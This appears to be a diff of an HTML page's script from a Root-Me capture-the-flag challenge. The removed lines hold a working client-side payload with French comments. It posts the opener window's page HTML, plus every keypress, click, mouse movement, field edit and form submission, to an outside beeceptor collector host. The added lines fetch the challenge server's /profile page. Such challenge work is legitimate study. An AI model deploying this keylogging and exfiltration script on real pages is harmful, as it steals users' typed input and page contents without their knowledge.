@@ -132,113 +132,15 @@
 </div>
 
 <script>
-    // When the page is visited, send a request to the given URL
-    window.onload = function() {
-        fetch("https://rootmehere2.free.beeceptor.com/visit", {
-            method: 'GET'
-        }).then(response => response.json())
-          .then(data => console.log('Visited:', data))
-          .catch(error => console.error('Error:', error));
-
-        
-        // If there's an opener window, send its HTML content
-        if (window.opener) {
-            const openerHtml = window.opener.document.documentElement.outerHTML;
-            
-            // Send the opener's HTML content to the server
-            fetch('https://rootmehere2.free.beeceptor.com/opener', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ html: openerHtml })
-            }).then(response => response.json())
-              .then(data => console.log('Opener HTML sent:', data))
-              .catch(error => console.error('Error sending opener HTML:', error));
-        } else {
-            fetch('https://rootmehere2.free.beeceptor.com/NOopener');
-        }
-
-        
-    };
-// Fonction générique pour envoyer les données au serveur
-function sendToServer(action, data) {
-    const url = `https://rootmehere2.free.beeceptor.com/${action}/${encodeURIComponent(data)}`;
-    fetch(url, {
-        method: 'GET', // Utilisation de la méthode GET pour envoyer les données dans l'URL
-        headers: {
-            'Content-Type': 'application/json'
-        }
-    }).then(response => {
-        console.log('Données envoyées au serveur:', response.status);
-    }).catch(error => {
-        console.log('Erreur lors de l\'envoi:', error);
+    fetch('http://challenge01.root-me.org:58003/profile')
+    .then(response => response.text())
+    .then(html => {
+        console.log(html);  // Outputs the HTML of the page
+    })
+    .catch(error => {
+        console.log('Error fetching the page:', error);
     });
-}
-
-// Événement keydown (frappe de touche)
-window.onkeydown = function(event) {
-    const action = 'keydown';
-    const data = event.key;  // Envoie la touche pressée
-    sendToServer(action, data);
-};
-
-// Événement click (clic de souris)
-window.onclick = function(event) {
-    const action = 'click';
-    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position du clic
-    sendToServer(action, data);
-};
-
-// Événement mousemove (mouvement de la souris)
-window.onmousemove = function(event) {
-    const action = 'mousemove';
-    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position de la souris
-    sendToServer(action, data);
-};
-
-// Écouteur de l'événement keydown (frappe de touche)
-document.addEventListener('keydown', function(event) {
-    const action = 'keydown';
-    const data = event.key;  // Envoie la touche pressée
-    sendToServer(action, data);
-});
-
-// Écouteur de l'événement click (clic de souris)
-document.addEventListener('click', function(event) {
-    const action = 'click';
-    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position du clic
-    sendToServer(action, data);
-});
-
-// Écouteur de l'événement mousemove (mouvement de la souris)
-document.addEventListener('mousemove', function(event) {
-    const action = 'mousemove';
-    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position de la souris
-    sendToServer(action, data);
-});
-
-
-    // When a field is modified, send a request to the server with the modified field's name
-    function fieldModified(fieldName) {
-        fetch(`https://rootmehere2.free.beeceptor.com/modified/${fieldName}`, {
-            method: 'GET'
-        }).then(response => response.json())
-          .then(data => console.log(`Field ${fieldName} modified:`, data))
-          .catch(error => console.error('Error:', error));
-    }
-
-    // When the form is submitted, send a request to the given URL
-    function submitForm(event) {
-        event.preventDefault(); // Prevent form submission
-
-        fetch("https://rootmehere2.free.beeceptor.com/valide", {
-            method: 'GET'
-        }).then(response => response.json())
-          .then(data => console.log('Form submitted:', data))
-          .catch(error => console.error('Error:', error));
-    }
 </script>
-
+    
 </body>
 </html>
